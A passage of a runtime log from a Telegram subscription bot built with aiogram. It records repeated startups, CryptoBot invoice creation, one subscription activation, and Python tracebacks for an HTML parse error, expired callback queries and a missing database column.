    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 79, in cmd_start
    await send_welcome(bot, user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 37, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
2026-05-14 20:29:34 | INFO     | __main__ | Запуск бота...
2026-05-14 20:29:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:29:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:29:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 20:29:34 | INFO     | __main__ | Запуск polling...
2026-05-14 20:29:34 | INFO     | database.db | База данных инициализирована
2026-05-14 20:29:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 20:29:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 20:29:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 20:29:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 20:29:35 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmWoG...
2026-05-14 20:29:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 20:29:36 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBj2oF...
2026-05-14 20:29:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 20:29:37 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 20:29:37 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 20:29:37 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 20:29:37 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 20:30:17 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 20:31:45 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 20:44:02 | INFO     | __main__ | Запуск бота...
2026-05-14 20:44:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:44:02 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:44:02 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 20:44:02 | INFO     | __main__ | Запуск polling...
2026-05-14 20:44:02 | INFO     | database.db | База данных инициализирована
2026-05-14 20:44:02 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 20:44:02 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 20:44:02 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 20:44:02 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 20:44:02 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmWoG...
2026-05-14 20:44:02 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 20:44:03 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBs2oG...
2026-05-14 20:44:03 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 20:44:04 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 20:44:04 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 20:44:04 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 20:44:05 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 20:44:10 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 20:44:19 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 20:51:48 | INFO     | __main__ | Запуск бота...
2026-05-18 20:51:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 20:51:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 20:51:48 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 20:51:48 | INFO     | __main__ | Запуск polling...
2026-05-18 20:51:49 | INFO     | database.db | База данных инициализирована
2026-05-18 20:51:49 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 20:51:49 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 20:51:49 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 20:51:49 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 20:51:49 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 20:51:49 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 20:51:50 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 20:51:50 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 20:51:52 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 20:51:52 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 20:51:52 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 20:51:52 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 20:51:56 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 20:52:52 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 20:53:02 | ERROR    | payments.lava | Lava API error: {'status': 'error', 'message': 'Invalid token', 'code': 5, 't': 'Empty $jwt'}
2026-05-18 20:57:34 | INFO     | __main__ | Запуск бота...
2026-05-18 20:57:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 20:57:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 20:57:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 20:57:34 | INFO     | __main__ | Запуск polling...
2026-05-18 20:57:34 | INFO     | database.db | База данных инициализирована
2026-05-18 20:57:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 20:57:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 20:57:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 20:57:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 20:57:35 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 20:57:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 20:57:35 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 20:57:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 20:57:36 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 20:57:36 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 20:57:36 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 20:57:36 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 20:57:42 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 20:57:46 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51863959
2026-05-18 20:57:47 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51863959
2026-05-18 20:58:22 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51864014
2026-05-18 20:58:22 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51864014
2026-05-18 21:01:44 | INFO     | __main__ | Запуск бота...
2026-05-18 21:01:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:01:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:01:44 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:01:44 | INFO     | __main__ | Запуск polling...
2026-05-18 21:01:44 | INFO     | database.db | База данных инициализирована
2026-05-18 21:01:44 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:01:44 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:01:44 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:01:44 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:01:45 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:01:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:01:45 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:01:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:01:46 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:01:46 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:01:46 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:01:46 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:01:54 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:01:58 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 866767
2026-05-18 21:01:58 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=866767
2026-05-18 21:23:54 | INFO     | __main__ | Запуск бота...
2026-05-18 21:23:54 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:23:54 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:23:54 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:23:54 | INFO     | __main__ | Запуск polling...
2026-05-18 21:23:54 | INFO     | database.db | База данных инициализирована
2026-05-18 21:23:54 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:23:54 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:23:54 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:23:54 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:23:55 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:23:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:23:55 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:23:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:23:56 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:23:56 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:23:56 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:23:56 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:24:00 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:24:07 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866002
2026-05-18 21:24:08 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866002
2026-05-18 21:24:32 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-18 21:24:32 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+FnDgouHDQb9hMDBi
2026-05-18 21:24:32 | INFO     | handlers.payment | Оплата подтверждена: user=733970441, tariff=month
2026-05-18 21:25:17 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:26:36 | INFO     | __main__ | Запуск бота...
2026-05-18 21:26:36 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:26:36 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:26:36 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:26:36 | INFO     | __main__ | Запуск polling...
2026-05-18 21:26:36 | INFO     | database.db | База данных инициализирована
2026-05-18 21:26:36 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:26:36 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:26:36 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:26:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:26:36 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:26:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:26:37 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:26:37 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:26:37 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:26:37 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:26:37 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:26:37 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:26:38 | ERROR    | aiogram.event | Cause exception while process update id=676578682 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: query is too old and response timeout expired or query ID is invalid
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\payment.py", line 92, in select_tariff
    await callback.answer()
  File "C:\python310\lib\site-packages\aiogram\methods\base.py", line 84, in emit
    return await bot(self)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: query is too old and response timeout expired or query ID is invalid
2026-05-18 21:26:38 | ERROR    | aiogram.event | Cause exception while process update id=676578681 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: query is too old and response timeout expired or query ID is invalid
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 86, in back_to_start
    await callback.answer()
  File "C:\python310\lib\site-packages\aiogram\methods\base.py", line 84, in emit
    return await bot(self)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: query is too old and response timeout expired or query ID is invalid
2026-05-18 21:26:44 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866216
2026-05-18 21:26:45 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866216
2026-05-18 21:31:34 | INFO     | __main__ | Запуск бота...
2026-05-18 21:31:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:31:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:31:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:31:34 | INFO     | __main__ | Запуск polling...
2026-05-18 21:31:34 | INFO     | database.db | База данных инициализирована
2026-05-18 21:31:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:31:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:31:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:31:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:31:35 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:31:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:31:37 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:31:37 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:31:38 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:31:38 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:31:38 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:31:38 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:31:41 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:31:48 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866625
2026-05-18 21:31:48 | ERROR    | aiogram.event | Cause exception while process update id=676578693 by bot id=7203775205
OperationalError: table payments has no column named pay_url
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\payment.py", line 181, in create_invoice
    await create_payment(
  File "C:\Users\Nikta\Desktop\bot\database\db.py", line 257, in create_payment
    async with db.execute("""
  File "C:\python310\lib\site-packages\aiosqlite\context.py", line 39, in __aenter__
    self._obj = await self._coro
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 193, in execute
    cursor = await self._execute(self._conn.execute, sql, parameters)
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 132, in _execute
    return await future
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 115, in run
    result = function()
sqlite3.OperationalError: table payments has no column named pay_url
2026-05-18 21:31:55 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866638
2026-05-18 21:31:55 | ERROR    | aiogram.event | Cause exception while process update id=676578695 by bot id=7203775205
OperationalError: table payments has no column named pay_url
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\payment.py", line 181, in create_invoice
    await create_payment(
  File "C:\Users\Nikta\Desktop\bot\database\db.py", line 257, in create_payment
    async with db.execute("""
